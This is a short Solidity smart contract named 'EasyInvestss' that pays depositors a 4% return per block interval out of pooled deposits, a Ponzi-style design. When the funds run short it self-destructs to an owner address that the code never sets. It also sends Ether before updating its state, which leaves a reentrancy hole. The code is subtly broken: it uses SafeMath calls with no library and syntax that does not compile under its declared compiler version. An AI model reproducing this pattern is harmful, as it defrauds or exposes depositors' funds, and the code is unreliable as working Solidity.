pragma solidity ^0.4.24;
contract EasyInvestss {
    mapping (address => uint256) invested;
    mapping (address => uint256) atBlock;
address public owner;
modifier onlyOwner() {
        require (msg.sender == owner);
        _;
    }
    function () external payable {
    if (invested[msg.sender] != 0) {
        uint256 amount = invested[msg.sender]
            .mul(4)
            .div(100)
            .mul(block.number.sub(atBlock[msg.sender]))
            .div(5900);

        if (address(this).balance < amount) {
            selfdestruct(owner);
            return;
        }

        address sender = msg.sender;
        (bool success, ) = sender.call.value(amount)('');
        require(success, 'Transfer failed.');
    }

    atBlock[msg.sender] = block.number;
    invested[msg.sender] = invested[msg.sender].add(msg.value);
}

}